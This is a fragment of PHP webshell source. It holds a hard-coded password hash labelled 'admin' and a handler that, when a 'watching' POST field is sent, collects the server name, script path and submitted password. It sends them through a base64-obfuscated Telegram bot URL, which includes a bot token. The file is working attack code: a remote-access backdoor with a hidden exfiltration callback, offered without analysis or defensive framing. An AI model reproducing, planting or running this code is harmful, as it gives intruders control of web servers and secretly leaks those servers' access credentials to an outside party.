<?php
//-----------------Password---------------------
$_password = "43211475147137eae2f51d87ee476786"; //admin
$_agent = true;
$_unicode = 'UTF-8';
$_action = 'Anonymizer';
...
if(array_key_exists('watching',$_POST)){
	$tmp = "Webshell Url: ".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."%0APassword: ".$_POST['pass']; file_get_contents(base64_decode("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDU0OTM4NjQxMTg6QUFHOVE1MEl2YU5mcjBPbkFTdlQ2MktCSmd1ekNyMkpnbDgvc2VuZE1lc3NhZ2U/Y2hhdF9pZD1AY0dWc1pYSWdhM1ZrWVEmdGV4dD0=").$tmp);
}
